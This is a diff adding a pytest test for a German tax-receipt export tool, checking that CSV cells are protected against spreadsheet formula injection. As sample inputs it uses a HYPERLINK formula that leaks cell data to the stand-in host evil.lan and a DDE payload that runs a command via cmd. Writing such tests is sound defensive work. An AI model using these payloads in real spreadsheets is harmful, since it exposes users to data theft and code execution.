@@ -123,6 +123,37 @@ class TestBuildZip:
         assert "Fehlend" in missing and "Vorhanden" not in missing
         assert not any(rows["Fehlend"]["Dateiname"] in n for n in names)
 
+    def test_formula_cells_are_neutralised(self, tmp_path):
+        """FH-03: Formeln aus untrusted Titel/Aussteller duerfen in Excel nicht
+        ausgewertet werden; eigene (negative) Betraege bleiben Zahlen."""
+        beleg = tmp_path / "beleg.pdf"
+        beleg.write_bytes(b"%PDF-1.4 dummy")
+        evil_title = '=HYPERLINK("http://evil.lan/?"&A2;"Beleg")'
+        evil_issuer = '@SUM(1+1)*cmd|" /C calc"!A0'
+        docs = [
+            _row(beleg, title=evil_title, issuer=evil_issuer, amount=Decimal("-12.50")),
+            _row(beleg, title="+49 Hotline", issuer="-Rabatt"),
+            _row(beleg, title="\tTab", issuer="Normal GmbH"),
+        ]
+        target = tmp_path / "out.zip"
+
+        _build_zip_sync(docs, 2025, include_pdf=True, include_csv=True, target=target)
+
+        with zipfile.ZipFile(target) as zf:
+            for name in ("Steuerpaket_2025/Gesamtuebersicht.csv", "Steuerpaket_2025/01_Werbungskosten/uebersicht.csv"):
+                rows = _read_csv(zf, name)
+                for row in rows:
+                    for key, value in row.items():
+                        if key != "Betrag":
+                            assert not value.startswith(("=", "+", "-", "@", "\t", "\r")), (key, value)
+                by_issuer = {r["Aussteller"]: r for r in rows}
+                assert by_issuer["'" + evil_issuer]["Titel"] == "'" + evil_title
+                assert by_issuer["'" + evil_issuer]["Betrag"] == "-12,50"
+                assert by_issuer["'-Rabatt"]["Titel"] == "'+49 Hotline"
+                assert by_issuer["Normal GmbH"]["Titel"] == "'\tTab"
+            # Das PDF zeigt die Originalwerte (keine Formel-Auswertung dort).
+            assert zf.read("Steuerpaket_2025/Uebersicht.pdf").startswith(b"%PDF")
+
     def test_non_eur_and_special_characters_in_pdf(self, tmp_path):
         """PDF mit Fremdwaehrung und '&'/'<' im Titel (reportlab-Markup) baut fehlerfrei."""
         beleg = tmp_path / "beleg.pdf"
